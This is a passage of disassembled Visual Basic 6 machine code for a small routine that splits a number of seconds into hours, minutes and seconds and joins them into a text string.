00853908: push ebx
00853909: push esi
0085390A: push edi
0085390B: mov var_0C, esp
0085390E: mov var_08, 0040C880h
00853915: mov eax, [ebp+10h]
00853918: and [eax], 00000000h
0085391B: mov eax, [ebp+0Ch]
0085391E: cdq 
0085391F: push 0000003Ch
00853921: pop ecx
00853922: idiv ecx
00853924: mov var_18, edx
00853927: mov eax, [ebp+0Ch]
0085392A: cdq 
0085392B: push 0000003Ch
0085392D: pop ecx
0085392E: idiv ecx
00853930: cdq 
00853931: push 0000003Ch
00853933: pop ecx
00853934: idiv ecx
00853936: mov var_000000A4, edx
0085393C: mov var_000000AC, 00000003h
00853946: lea edx, var_000000AC
0085394C: lea ecx, var_48
0085394F: call 00410922h ; msvbvm60.dll.__vbaVarMove
00853954: mov eax, [ebp+0Ch]
00853957: cdq 
00853958: mov ecx, 00000E10h
0085395D: idiv ecx
0085395F: cdq 
00853960: push 00000018h
00853962: pop ecx
00853963: idiv ecx
00853965: mov var_000000A4, edx
0085396B: mov var_000000AC, 00000003h
00853975: lea edx, var_000000AC
0085397B: lea ecx, var_38
0085397E: call 00410922h ; msvbvm60.dll.__vbaVarMove
00853983: mov var_000000A4, 00455334h ; h :
0085398D: mov var_000000AC, 00000008h
00853997: mov var_000000B4, 00455344h ; m :
008539A1: mov var_000000BC, 00000008h
008539AB: mov eax, var_18
008539AE: mov var_000000C4, eax
008539B4: mov var_000000CC, 00000003h
008539BE: mov var_000000D4, 004412D8h
008539C8: mov var_000000DC, 00000008h
008539D2: lea eax, var_38
008539D5: push eax
008539D6: lea eax, var_000000AC
008539DC: push eax
008539DD: lea eax, var_5C
008539E0: push eax
008539E1: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008539E6: push eax
008539E7: lea eax, var_48
008539EA: push eax
008539EB: lea eax, var_6C
008539EE: push eax
008539EF: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008539F4: push eax
008539F5: lea eax, var_000000BC
008539FB: push eax
008539FC: lea eax, var_7C
008539FF: push eax
00853A00: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00853A05: push eax
00853A06: lea eax, var_000000CC
00853A0C: push eax
00853A0D: lea eax, var_0000008C
00853A13: push eax
00853A14: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00853A19: push eax
00853A1A: lea eax, var_000000DC
00853A20: push eax
00853A21: lea eax, var_0000009C
00853A27: push eax
00853A28: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00853A2D: push eax
00853A2E: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00853A33: mov edx, eax
00853A35: lea ecx, var_4C
00853A38: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00853A3D: lea eax, var_0000009C
00853A43: push eax
00853A44: lea eax, var_0000008C
00853A4A: push eax
00853A4B: lea eax, var_7C
00853A4E: push eax
00853A4F: lea eax, var_6C
00853A52: push eax
00853A53: lea eax, var_5C
00853A56: push eax
00853A57: push 00000005h
00853A59: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00853A5E: add esp, 00000018h
00853A61: push 00853AB8h
00853A66: jmp 853A9Fh
00853A68: mov eax, var_04
00853A6B: and eax, 00000004h
00853A6E: test eax, eax
00853A70: jz 853A7Ah
00853A72: lea ecx, var_4C
00853A75: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00853A7A: lea eax, var_0000009C
00853A80: push eax
00853A81: lea eax, var_0000008C
00853A87: push eax
00853A88: lea eax, var_7C
00853A8B: push eax
00853A8C: lea eax, var_6C
00853A8F: push eax
00853A90: lea eax, var_5C
00853A93: push eax
00853A94: push 00000005h
00853A96: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00853A9B: add esp, 00000018h
00853A9E: ret 
End Sub

